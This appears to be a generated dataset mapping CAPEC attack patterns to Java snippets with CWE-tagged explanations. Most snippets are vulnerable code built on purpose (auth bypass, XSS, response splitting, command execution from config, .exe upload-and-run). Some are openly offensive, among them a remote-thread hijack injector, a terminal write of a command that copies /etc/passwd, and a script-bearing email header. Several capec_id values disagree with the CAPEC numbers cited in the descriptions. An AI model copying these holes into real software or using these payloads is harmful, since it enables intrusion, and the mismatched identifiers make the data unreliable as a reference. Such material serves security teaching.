        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server is listening on port 8080\");\n\n        while (true) {\n            Socket socket = serverSocket.accept();\n            new ClientHandler(socket).start();\n        }\n    }\n}\n\nclass ClientHandler extends Thread {\n    private Socket socket;\n\n    public ClientHandler(Socket socket) {\n        this.socket = socket;\n    }\n\n    public void run() {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n\n            String clientMessage = in.readLine();\n            if (clientMessage.startsWith(\"AUTH\")) {\n                String[] parts = clientMessage.split(\" \");\n                String username = parts[1];\n                String password = parts[2];\n\n                // Improper Authentication: No validation of credentials\n                if (username.equals(\"admin\")) {\n                    out.println(\"Welcome, \" + username);\n                } else {\n                    out.println(\"Invalid credentials\");\n                }\n            } else {\n                out.println(\"Please authenticate first\");\n            }\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that listens for client connections on port 8080. The server accepts client connections and expects an authentication message in the format 'AUTH username password'. However, the authentication mechanism is improperly implemented (CWE-287: Improper Authentication) as it only checks if the username is 'admin' without validating the password. This allows an attacker to bypass authentication by simply using the username 'admin'. Additionally, the server does not validate the input properly (CWE-20: Improper Input Validation), which could lead to further exploitation. The code demonstrates the main idea of CAPEC-290: Exploiting Trust in Client, where the server places implicit trust in the client without proper verification, making it vulnerable to spoofing attacks."
    },
    {
        "capec_id": "23",
        "capec_name": "File Content Injection",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class FileUploadHandler {\n    public void handleFileUpload(InputStream fileInputStream, String fileName) throws IOException {\n        // CWE-434: Unrestricted Upload of File with Dangerous Type\n        Path uploadPath = Paths.get(\"/uploads/\" + fileName);\n        Files.copy(fileInputStream, uploadPath, StandardCopyOption.REPLACE_EXISTING);\n\n        // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n        if (fileName.endsWith(\".exe\")) {\n            // CWE-506: Embedded Malicious Code\n            executeFile(uploadPath.toString());\n        }\n    }\n\n    private void executeFile(String filePath) throws IOException {\n        // CWE-20: Improper Input Validation\n        ProcessBuilder pb = new ProcessBuilder(filePath);\n        pb.start();\n    }\n\n    public static void main(String[] args) throws IOException {\n        // Simulate file upload\n        FileInputStream fis = new FileInputStream(\"malicious.exe\");\n        new FileUploadHandler().handleFileUpload(fis, \"malicious.exe\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable file upload handler that embodies the main idea of CAPEC-152: File Content Injection. The code allows an attacker to upload a file without proper validation (CWE-434) and relies on the file name or extension to determine behavior (CWE-646). If the uploaded file has a dangerous extension like '.exe', it is executed without proper validation (CWE-20), potentially allowing embedded malicious code to run (CWE-506). This represents a scenario where an adversary could poison files with a malicious payload, exploiting the host's trust in executing remote content."
    },
    {
        "capec_id": "24",
        "capec_name": "Filter Failure through Buffer Overflow",
        "code_snippet": "import java.util.Scanner;\n\npublic class FilterFailureExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your input:\");\n        String userInput = scanner.nextLine();\n\n        // Vulnerable buffer size\n        char[] buffer = new char[10];\n\n        // Attempt to copy user input to buffer without size check\n        for (int i = 0; i < userInput.length(); i++) {\n            buffer[i] = userInput.charAt(i); // CWE-120, CWE-119\n        }\n\n        // Simulate a filter that fails to handle oversized input\n        if (userInput.length() > buffer.length) {\n            System.out.println(\"Filter failed: input too long\"); // CWE-20\n        } else {\n            System.out.println(\"Input accepted: \" + new String(buffer));\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a filter failure through a buffer overflow. The program reads user input and attempts to copy it into a fixed-size buffer without checking the input size, leading to a potential buffer overflow (CWE-120, CWE-119). If the input length exceeds the buffer size, the filter fails, and the program prints a failure message (CWE-20). This example embodies the main idea of CAPEC-128, where an attacker can cause an active filter to fail by providing overly long input, potentially allowing unfiltered input into the system."
    },
    {
        "capec_id": "25",
        "capec_name": "Forced Deadlock",
        "code_snippet": "public class DeadlockExample {\n    private static final Object lock1 = new Object();\n    private static final Object lock2 = new Object();\n\n    public static void main(String[] args) {\n        Thread thread1 = new Thread(() -> {\n            synchronized (lock1) {\n                System.out.println(\"Thread 1: Holding lock 1...\");\n                try { Thread.sleep(100); } catch (InterruptedException e) {}\n                System.out.println(\"Thread 1: Waiting for lock 2...\");\n                synchronized (lock2) {\n                    System.out.println(\"Thread 1: Holding lock 1 & 2...\");\n                }\n            }\n        });\n\n        Thread thread2 = new Thread(() -> {\n            synchronized (lock2) {\n                System.out.println(\"Thread 2: Holding lock 2...\");\n                try { Thread.sleep(100); } catch (InterruptedException e) {}\n                System.out.println(\"Thread 2: Waiting for lock 1...\");\n                synchronized (lock1) {\n                    System.out.println(\"Thread 2: Holding lock 2 & 1...\");\n                }\n            }\n        });\n\n        thread1.start();\n        thread2.start();\n    }\n}",
        "description": "This Java code snippet demonstrates a classic deadlock scenario, which aligns with the CAPEC description of 'Forced Deadlock'. The code creates two threads, each attempting to acquire two locks (lock1 and lock2) in different orders. Thread 1 acquires lock1 and then tries to acquire lock2, while Thread 2 acquires lock2 and then tries to acquire lock1. This situation leads to a deadlock because each thread is waiting for the other to release the lock it needs, and thus neither thread can proceed. This example also touches on related CWEs such as 'Improper Synchronization' (CWE-662) and 'Deadlock' (CWE-833), illustrating how improper handling of locks can lead to a deadlock condition, causing a denial of service."
    },
    {
        "capec_id": "26",
        "capec_name": "Leveraging Race Conditions",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class RaceConditionExample {\n    private static final String FILE_PATH = \"example.txt\";\n    private static final Object lock = new Object();\n\n    public static void main(String[] args) throws InterruptedException {\n        Thread writerThread = new Thread(() -> {\n            synchronized (lock) {\n                try (FileWriter writer = new FileWriter(FILE_PATH)) {\n                    writer.write(\"Original Content\");\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        });\n\n        Thread attackerThread = new Thread(() -> {\n            synchronized (lock) {\n                File file = new File(FILE_PATH);\n                if (file.exists()) {\n                    file.delete();\n                    try (FileWriter writer = new FileWriter(FILE_PATH)) {\n                        writer.write(\"Malicious Content\");\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        });\n\n        writerThread.start();\n        attackerThread.start();\n\n        writerThread.join();\n        attackerThread.join();\n    }\n}",
        "description": "This Java code snippet demonstrates a race condition vulnerability where two threads are attempting to write to the same file concurrently. The `writerThread` writes 'Original Content' to 'example.txt', while the `attackerThread` deletes the file and writes 'Malicious Content' instead. Both threads use a shared lock object to synchronize their actions, but the synchronization is not sufficient to prevent the race condition. This example embodies the main idea of CAPEC-367 (Leveraging Race Conditions) and related CWEs such as CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization) and CWE-667 (Improper Locking). The code highlights how improper synchronization can lead to a race condition, allowing an attacker to manipulate the file content."
    },
    {
        "capec_id": "27",
        "capec_name": "Leveraging Race Conditions via Symbolic Links",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.PosixFilePermissions;\n\npublic class SymlinkRaceCondition {\n    public static void main(String[] args) {\n        String tempFileName = \"/tmp/tempfile.txt\";\n        String sensitiveFileName = \"/etc/sensitivefile.txt\";\n        Path tempFilePath = Paths.get(tempFileName);\n        Path sensitiveFilePath = Paths.get(sensitiveFileName);\n\n        try {\n            // Check if the temporary file exists\n            if (Files.exists(tempFilePath)) {\n                System.out.println(\"Temporary file already exists.\");\n                return;\n            }\n\n            // Simulate a delay to create a race condition window\n            Thread.sleep(1000);\n\n            // Create the temporary file\n            Files.createFile(tempFilePath);\n            System.out.println(\"Temporary file created.\");\n\n            // Write to the temporary file\n            try (FileWriter writer = new FileWriter(tempFileName)) {\n                writer.write(\"This is a temporary file.\");\n            }\n\n            System.out.println(\"Written to temporary file.\");\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a race condition vulnerability involving symbolic links. The code checks if a temporary file exists, waits for a short period (simulating a delay), and then creates and writes to the temporary file. An attacker could exploit this by creating a symbolic link to a sensitive file (e.g., /etc/sensitivefile.txt) during the delay, causing the program to write to the sensitive file instead of the intended temporary file. This embodies the main idea of CAPEC-367 (Time-of-check Time-of-use Race Condition) and CWE-61 (UNIX Symbolic Link (Symlink) Following)."
    },
    {
        "capec_id": "28",
        "capec_name": "Fuzzing",
        "code_snippet": "import java.io.*;\nimport java.util.Random;\n\npublic class FuzzingExample {\n    public static void main(String[] args) {\n        FuzzingExample example = new FuzzingExample();\n        for (int i = 0; i < 1000; i++) {\n            String fuzzInput = example.generateFuzzInput();\n            example.processInput(fuzzInput);\n        }\n    }\n\n    public String generateFuzzInput() {\n        Random random = new Random();\n        int length = random.nextInt(100) + 1;\n        StringBuilder sb = new StringBuilder(length);\n        for (int i = 0; i < length; i++) {\n            sb.append((char) (random.nextInt(95) + 32)); // Generate random ASCII characters\n        }\n        return sb.toString();\n    }\n\n    public void processInput(String input) {\n        try {\n            // Simulate processing input\n            if (input.contains(\"<script>\")) {\n                throw new IllegalArgumentException(\"Invalid input detected\");\n            }\n            System.out.println(\"Processed input: \" + input);\n        } catch (Exception e) {\n            System.err.println(\"Error processing input: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic fuzzing example where random inputs are generated and processed to identify potential weaknesses in the system. The `generateFuzzInput` method creates random strings of varying lengths, which are then passed to the `processInput` method. The `processInput` method simulates input processing and checks for a specific pattern (`<script>`), throwing an exception if the pattern is found. This simulates improper input validation (CWE-20) and the generation of error messages containing sensitive information (CWE-209). The code embodies the main idea of fuzzing (CAPEC-74) by treating the system as a black box and using random inputs to uncover potential vulnerabilities."
    },
    {
        "capec_id": "29",
        "capec_name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\n\npublic class TOCTOURaceCondition {\n    public static void main(String[] args) {\n        Path filePath = Paths.get(\"/tmp/sensitive_file.txt\");\n\n        // Time of Check\n        if (Files.exists(filePath)) {\n            System.out.println(\"File exists, proceeding to read.\");\n\n            // Simulate a delay to represent the time window between check and use\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n\n            // Time of Use\n            try (FileInputStream fis = new FileInputStream(filePath.toFile())) {\n                byte[] data = new byte[(int) filePath.toFile().length()];\n                fis.read(data);\n                System.out.println(\"File content: \" + new String(data));\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } else {\n            System.out.println(\"File does not exist.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Time-of-Check to Time-of-Use (TOCTOU) race condition. The program first checks if a file exists at a specified path (Time of Check). If the file exists, it proceeds to read the file after a delay (Time of Use). During the delay, an attacker could potentially replace or modify the file, leading to unexpected behavior when the file is read. This example highlights the vulnerability where the state of the file can change between the check and the use, which is the essence of a TOCTOU race condition. The delay simulates the time window in which an attacker could exploit this race condition."
    },
    {
        "capec_id": "30",
        "capec_name": "Hijacking a Privileged Thread of Execution",
        "code_snippet": "import com.sun.jna.Memory;\nimport com.sun.jna.Native;\nimport com.sun.jna.Pointer;\nimport com.sun.jna.platform.win32.Kernel32;\nimport com.sun.jna.platform.win32.WinNT;\n\npublic class PrivilegedThreadHijack {\n    public static void main(String[] args) {\n        int pid = 1234; // Target process ID\n        WinNT.HANDLE process = Kernel32.INSTANCE.OpenProcess(WinNT.PROCESS_ALL_ACCESS, false, pid);\n        if (process == null) {\n            System.err.println(\"Failed to open process\");\n            return;\n        }\n\n        WinNT.HANDLE thread = Kernel32.INSTANCE.CreateRemoteThread(process, null, 0, new Pointer(0x12345678), null, 0, null);\n        if (thread == null) {\n            System.err.println(\"Failed to create remote thread\");\n            return;\n        }\n\n        Kernel32.INSTANCE.SuspendThread(thread);\n\n        Memory shellcode = new Memory(1024);\n        shellcode.setString(0, \"malicious code\");\n        Pointer threadContext = new Memory(1024);\n        Kernel32.INSTANCE.GetThreadContext(thread, threadContext);\n        threadContext.setPointer(0, shellcode);\n        Kernel32.INSTANCE.SetThreadContext(thread, threadContext);\n\n        Kernel32.INSTANCE.ResumeThread(thread);\n        Kernel32.INSTANCE.CloseHandle(thread);\n        Kernel32.INSTANCE.CloseHandle(process);\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of hijacking a privileged thread of execution by injecting malicious code into a running process. The code uses the JNA (Java Native Access) library to interact with Windows API functions. It opens a target process with all access rights, creates a remote thread within that process, suspends the thread, and then manipulates the thread's context to inject malicious code. Finally, it resumes the thread, effectively hijacking its execution. This example embodies the CAPEC of 'Hijacking a Privileged Thread of Execution' and touches on related CWEs such as 'Privilege Context Switching Error' and 'Process Control'."
    },
    {
        "capec_id": "31",
        "capec_name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "code_snippet": "import javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class VulnerableCookieHandler {\n\n    public void handleRequest(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // Retrieve cookie without validation\n        Cookie[] cookies = request.getCookies();\n        String sessionId = null;\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (\"sessionId\".equals(cookie.getName())) {\n                    sessionId = cookie.getValue();\n                    break;\n                }\n            }\n        }\n\n        // Assume sessionId is immutable and use it directly\n        if (sessionId != null) {\n            // Simulate sensitive operation based on sessionId\n            response.getWriter().println(\"Welcome back, user with session: \" + sessionId);\n        } else {\n            // Create a new sessionId and set it in a cookie\n            sessionId = \"newSessionId123\";\n            Cookie newCookie = new Cookie(\"sessionId\", sessionId);\n            newCookie.setHttpOnly(true); // Attempt to mitigate some risks\n            response.addCookie(newCookie);\n            response.getWriter().println(\"New session created with sessionId: \" + sessionId);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of handling HTTP cookies in a web application. The code retrieves cookies from the incoming HTTP request without proper validation (CWE-565, CWE-20). It assumes the sessionId cookie is immutable and uses it directly for a security-critical operation (CWE-302, CWE-472). The sessionId is stored in cleartext in the cookie (CWE-315) and is not encrypted during transmission (CWE-311). Additionally, the code does not invalidate any existing session identifier when creating a new session (CWE-384). This example embodies the main idea of CAPEC-Accessing/Intercepting/Modifying HTTP Cookies, highlighting the risks of relying on cookies without proper validation and integrity checks."
    },
    {
        "capec_id": "32",
        "capec_name": "XSS Through HTTP Query Strings",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\" + userInput + \"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to Cross-Site Scripting (XSS) through HTTP query strings. The servlet processes a GET request and retrieves a parameter named 'input' from the query string without any validation or sanitization. It then directly includes this user input in the HTML response. This lack of proper neutralization of special characters (CWE-80, CWE-79) and improper encoding or escaping of output (CWE-116) allows an attacker to inject malicious scripts. Additionally, using the GET method to process sensitive information (CWE-598) can expose the application to further risks. This code snippet embodies the main idea of CAPEC-463 by showing how an adversary can exploit such vulnerabilities to execute arbitrary scripts in the victim's browser."
    },
    {
        "capec_id": "33",
        "capec_name": "HTTP Request Smuggling",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class HttpRequestSmugglingServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // Read the original request\n        BufferedReader reader = request.getReader();\n        StringBuilder originalRequest = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            originalRequest.append(line).append(\"\\n\");\n        }\n\n        // Simulate a proxy that incorrectly handles CRLF sequences\n        String manipulatedRequest = originalRequest.toString().replace(\"\\r\\n\", \"\\n\");\n\n        // Forward the manipulated request to the backend server\n        URL url = new URL(\"http://backend-server/endpoint\");\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setDoOutput(true);\n        conn.setRequestMethod(\"POST\");\n        OutputStream os = conn.getOutputStream();\n        os.write(manipulatedRequest.getBytes());\n        os.flush();\n        os.close();\n\n        // Read the response from the backend server\n        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n        String inputLine;\n        StringBuilder responseContent = new StringBuilder();\n        while ((inputLine = in.readLine()) != null) {\n            responseContent.append(inputLine);\n        }\n        in.close();\n\n        // Send the backend response to the original client\n        response.getWriter().write(responseContent.toString());\n    }\n}",
        "description": "This Java servlet demonstrates an HTTP Request Smuggling attack. The servlet reads an incoming HTTP POST request, manipulates it by incorrectly handling CRLF sequences (related to CWE-113), and forwards the manipulated request to a backend server. The backend server processes the manipulated request, potentially leading to unintended behavior due to inconsistent interpretation (CWE-444). The servlet then reads the response from the backend server and sends it back to the original client. This code highlights the risks associated with improper handling of HTTP requests by intermediary agents, which can lead to unauthorized and malicious requests reaching the backend server."
    },
    {
        "capec_id": "34",
        "capec_name": "HTTP Response Splitting",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        // Vulnerable to HTTP Response Splitting\n        response.setHeader(\"Location\", \"/newpage?param=\" + userInput);\n        response.getWriter().println(\"<html><body>Redirecting...</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to HTTP Response Splitting. The servlet reads a parameter 'input' from the HTTP request and directly includes it in the 'Location' header of the HTTP response without proper sanitization. If an attacker provides a malicious input containing CRLF sequences (e.g., '%0d%0a'), they can inject additional headers or even entire HTTP responses. This can lead to various attacks, such as cache poisoning, cross-site scripting (XSS), or session fixation. The code snippet embodies the main idea of CAPEC-34 (HTTP Response Splitting) and is related to CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers)."
    },
    {
        "capec_id": "35",
        "capec_name": "Leverage Executable Code in Non-Executable Files",
        "code_snippet": "import java.io.*;\nimport java.util.Properties;\n\npublic class VulnerableConfigLoader {\n    public static void main(String[] args) {\n        try {\n            Properties config = new Properties();\n            FileInputStream fis = new FileInputStream(\"config.properties\");\n            config.load(fis);\n            fis.close();\n\n            // Vulnerable code: directly using untrusted input in an eval statement\n            String command = config.getProperty(\"command\");\n            Runtime.getRuntime().exec(command);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an application loads a configuration file ('config.properties') and directly uses a property value to execute a command. The 'command' property from the configuration file is read and passed to 'Runtime.getRuntime().exec()', which can lead to code injection if an attacker modifies the configuration file to include malicious commands. This embodies the CAPEC 'Leverage Executable Code in Non-Executable Files' by exploiting the trust in configuration files. The related CWEs are represented as follows: CWE-94 (Code Injection) by executing untrusted input, CWE-96 (Static Code Injection) by inserting untrusted input into an executable resource, and CWE-95 (Eval Injection) by using untrusted input in a dynamic evaluation call."
    },
    {
        "capec_id": "36",
        "capec_name": "Using Unpublished Interfaces or Functionality",
        "code_snippet": "public class UnpublishedInterface {\n    // Undocumented and unpublished method\n    public void unpublishedMethod() {\n        System.out.println(\"Executing unpublished method\");\n        // Critical functionality without authentication or authorization\n        performCriticalOperation();\n    }\n\n    private void performCriticalOperation() {\n        // Critical operation that should be protected\n        System.out.println(\"Critical operation performed\");\n    }\n\n    public static void main(String[] args) {\n        UnpublishedInterface ui = new UnpublishedInterface();\n        // Directly invoking the unpublished method\n        ui.unpublishedMethod();\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Using Unpublished Interfaces or Functionality' (CAPEC). The class `UnpublishedInterface` contains an undocumented and unpublished method `unpublishedMethod` that invokes a critical operation `performCriticalOperation` without any authentication or authorization checks. This represents CWE-306 (Missing Authentication for Critical Function) and CWE-862 (Missing Authorization). The critical operation is performed without any protection mechanism, aligning with CWE-693 (Protection Mechanism Failure). The method is directly invoked in the `main` method, showcasing how an attacker might exploit such an interface to perform unauthorized actions."
    },
    {
        "capec_id": "37",
        "capec_name": "Retrieve Embedded Sensitive Data",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class SensitiveDataExample {\n    public static void main(String[] args) {\n        String sensitiveData = \"password123\"; // CWE-312: Cleartext Storage of Sensitive Information\n        File file = new File(\"sensitiveData.txt\");\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(sensitiveData); // CWE-312: Cleartext Storage of Sensitive Information\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        // CWE-226: Sensitive Information in Resource Not Removed Before Reuse\n        // The sensitive data is not cleared from memory after use\n    }\n}",
        "description": "This Java code snippet demonstrates the vulnerability described in CAPEC- Retrieve Embedded Sensitive Data. The code stores sensitive information (a password) in cleartext within a file, which is a direct example of CWE-312 (Cleartext Storage of Sensitive Information). Additionally, the sensitive data is not cleared from memory after use, which aligns with CWE-226 (Sensitive Information in Resource Not Removed Before Reuse). This code represents the main idea of the CAPEC by showing how sensitive data can be embedded within a system and potentially exposed to attackers."
    },
    {
        "capec_id": "38",
        "capec_name": "Leveraging/Manipulating Configuration File Search Paths",
        "code_snippet": "import java.io.*;\n\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        String configPath = System.getenv(\"CONFIG_PATH\");\n        if (configPath == null) {\n            configPath = \"./default/config.properties\";\n        }\n\n        try (FileInputStream fis = new FileInputStream(configPath)) {\n            Properties config = new Properties();\n            config.load(fis);\n\n            String dbPassword = config.getProperty(\"db.password\");\n            System.out.println(\"Database password: \" + dbPassword);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the CAPEC 'Leveraging/Manipulating Configuration File Search Paths'. The program reads a configuration file path from an environment variable 'CONFIG_PATH'. If the environment variable is not set, it defaults to a local path './default/config.properties'. The code then loads properties from the specified configuration file and prints the database password.\n\nThe vulnerabilities present in this code include:\n1. CWE-426 (Untrusted Search Path): The program uses an externally-supplied search path (CONFIG_PATH) which can be manipulated by an attacker to point to a malicious configuration file.\n2. CWE-427 (Uncontrolled Search Path Element): The default path './default/config.properties' can be replaced by an attacker if they have write access to the directory.\n3. CWE-73 (External Control of File Name or Path): The file path is controlled by an external input (environment variable).\n4. CWE-555 (J2EE Misconfiguration: Plaintext Password in Configuration File): The configuration file may store sensitive information like plaintext passwords.\n5. CWE-99 (Improper Control of Resource Identifiers): The program does not validate or sanitize the input path, allowing potential resource injection.\n\nThis code snippet highlights the risks of using external inputs for critical resource paths and the importance of securing configuration files and paths."
    },
    {
        "capec_id": "39",
        "capec_name": "Manipulating Opaque Client-based Data Tokens",
        "code_snippet": "import javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableTokenHandler {\n\n    public void handleRequest(HttpServletRequest request, HttpServletResponse response) {\n        // Retrieve token from cookie\n        Cookie[] cookies = request.getCookies();\n        String token = null;\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (\"authToken\".equals(cookie.getName())) {\n                    token = cookie.getValue();\n                    break;\n                }\n            }\n        }\n\n        // Assume token is immutable and use it directly\n        if (token != null) {\n            // Perform authentication based on token\n            if (authenticateUser(token)) {\n                response.setStatus(HttpServletResponse.SC_OK);\n                response.getWriter().write(\"Authenticated\");\n            } else {\n                response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);\n                response.getWriter().write(\"Authentication Failed\");\n            }\n        } else {\n            response.setStatus(HttpServletResponse.SC_BAD_REQUEST);\n            response.getWriter().write(\"No auth token provided\");\n        }\n    }\n\n    private boolean authenticateUser(String token) {\n        // Dummy authentication logic\n        return \"validToken123\".equals(token);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of handling authentication tokens stored in cookies. The code retrieves a token from a cookie named 'authToken' and uses it directly for authentication without performing any integrity checks or validation. This embodies the main idea of CAPEC-Token Manipulation, where client-side tokens are assumed to be immutable and secure, but can be tampered with by an attacker. The related CWEs are represented as follows:\n\n- CWE-353: Missing Support for Integrity Check - The code does not verify the integrity of the token.\n- CWE-285: Improper Authorization - The code does not perform proper authorization checks.\n- CWE-302: Authentication Bypass by Assumed-Immutable Data - The token is assumed to be immutable and is used directly for authentication.\n- CWE-472: External Control of Assumed-Immutable Web Parameter - The token is externally controllable via cookies.\n- CWE-565: Reliance on Cookies without Validation and Integrity Checking - The code relies on the cookie value without validation.\n- CWE-315: Cleartext Storage of Sensitive Information in a Cookie - Although not explicitly shown, storing sensitive tokens in cookies can lead to this issue.\n- CWE-539: Use of Persistent Cookies Containing Sensitive Information - Persistent cookies with sensitive information can be exploited.\n- CWE-384: Session Fixation - The code does not handle session fixation attacks.\n- CWE-233: Improper Handling of Parameters - The code does not handle cases where the token is missing or malformed properly."
    },
    {
        "capec_id": "40",
        "capec_name": "Manipulating Writeable Terminal Devices",
        "code_snippet": "import java.io.*;\n\npublic class TerminalDeviceExploit {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java TerminalDeviceExploit <target_terminal>\");\n            return;\n        }\n\n        String targetTerminal = args[0];\n        String maliciousCommand = \"cat /etc/passwd > /tmp/stolen_passwd\";\n\n        try (BufferedWriter writer = new BufferedWriter(new FileWriter(targetTerminal))) {\n            writer.write(maliciousCommand);\n            writer.newLine();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the 'Manipulating Writeable Terminal Devices' attack. The program takes a target terminal device as an argument and writes a malicious command to it. The command 'cat /etc/passwd > /tmp/stolen_passwd' is intended to copy the contents of the /etc/passwd file to a temporary directory, which the attacker can later access. This code embodies the main idea of the CAPEC by exploiting a writable terminal device to execute a command with the target user's privileges. The related CWEs are represented as follows:\n- CWE-77 and CWE-78: The code constructs a command using external input (the target terminal) without proper neutralization.\n- CWE-214: The command is visible in the source code and could be seen by other processes.\n- CWE-114: The code executes a command that could be malicious.\n- CWE-529: The command writes the output to a directory that may be accessible to unauthorized users."
    },
    {
        "capec_id": "41",
        "capec_name": "Using Meta-characters in E-mail Headers to Inject Malicious Payloads",
        "code_snippet": "import java.util.Properties;\nimport javax.mail.*;\nimport javax.mail.internet.*;\n\npublic class EmailSender {\n    public static void main(String[] args) {\n        String to = \"victim@example.com\";\n        String from = \"attacker@example.com\";\n        String host = \"smtp.example.com\";\n\n        Properties properties = System.getProperties();\n        properties.setProperty(\"mail.smtp.host\", host);\n\n        Session session = Session.getDefaultInstance(properties);\n\n        try {\n            MimeMessage message = new MimeMessage(session);\n            message.setFrom(new InternetAddress(from));\n            message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));\n            message.setSubject(\"Test Email\");\n\n            // Vulnerable code: Injecting malicious payload in email header\n            String maliciousHeader = \"\\nX-Injected-Header: <script>alert('Injected!');</script>\";\n            message.addHeader(\"X-Custom-Header\", maliciousHeader);\n\n            message.setText(\"This is a test email with a malicious header.\");\n\n            Transport.send(message);\n            System.out.println(\"Sent message successfully....\");\n        } catch (MessagingException mex) {\n            mex.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an attacker might inject a malicious payload into an email header. The code sets up a simple email sending mechanism using JavaMail API. The key part of the vulnerability is the injection of a malicious script into a custom email header (X-Custom-Header). This header contains a script tag that could potentially be executed by an email client that improperly handles or displays email headers. This example embodies the CAPEC concept of using meta-characters in email headers to inject malicious payloads. The related CWEs are represented by the improper neutralization of meta-characters (CWE-150), improper encoding or escaping of output (CWE-116), and improper neutralization of HTTP headers for scripting syntax (CWE-644)."
    },
    {
        "capec_id": "42",
        "capec_name": "MIME Conversion",
        "code_snippet": "import java.io.*;\nimport java.util.Base64;\n\npublic class MimeConversion {\n    public static void main(String[] args) {\n        String input = \"VGhpcyBpcyBhIHRlc3Qgc3RyaW5nIHRoYXQgaXMgdG9vIGxvbmcgdG8gYmUgY29udmVydGVkIHRvIE1JTUUu\";\n        try {\n            byte[] decodedBytes = Base64.getDecoder().decode(input);\n            String decodedString = new String(decodedBytes, \"UTF-8\");\n            System.out.println(\"Decoded String: \" + decodedString);\n        } catch (UnsupportedEncodingException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void mimeConversion(String input) {\n        byte[] buffer = new byte[50]; // Fixed buffer size\n        try {\n            byte[] inputBytes = input.getBytes(\"UTF-8\");\n            System.arraycopy(inputBytes, 0, buffer, 0, inputBytes.length); // Potential buffer overflow\n            String mimeString = new String(buffer, \"UTF-8\");\n            System.out.println(\"MIME Converted String: \" + mimeString);\n        } catch (UnsupportedEncodingException e) {\n            e.printStackTrace();\n        }\n    }\n}",
